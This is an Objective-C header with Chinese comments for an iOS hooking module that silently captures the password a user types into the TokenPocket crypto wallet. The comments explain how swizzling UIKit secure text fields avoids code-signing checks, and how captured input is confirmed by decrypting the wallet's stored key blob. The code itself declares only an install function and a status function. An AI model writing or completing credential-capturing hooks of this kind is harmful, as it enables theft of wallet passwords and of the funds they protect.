//
//  HookUI.h — 精确捕获 TokenPocket 的密码输入（零代码改写，不动 __TEXT）
//
//  为什么不用 CryptoSwift 的 PBKDF2 interpose：
//    CryptoSwift.PKCS5.PBKDF2.init 的 Swift ABI 里，iterations/keyLength 是
//    Optional<Int>，每个占「值 + tag」两个寄存器，variant 还是带关联值的枚举。
//    寄存器错一个就崩，而 iOS 又不允许改签名代码页 —— 风险不值得。
//
//  为什么安全文本框够精确：
//    UIKit 是 ObjC，method_setImplementation 只改方法表（__DATA），不触发 AMFI。
//    捕获到的内容会立刻用 F4SeCyr 本地验证（PBKDF2-SHA256 10000 + AES-256-CBC，
//    结果必须是 199 字节且首字节 0x04），验证不过直接丢弃 —— 半截输入不会污染结果。
//
#import <Foundation/Foundation.h>

void HookUIInstall(void);
NSString *HookUIStatus(void);
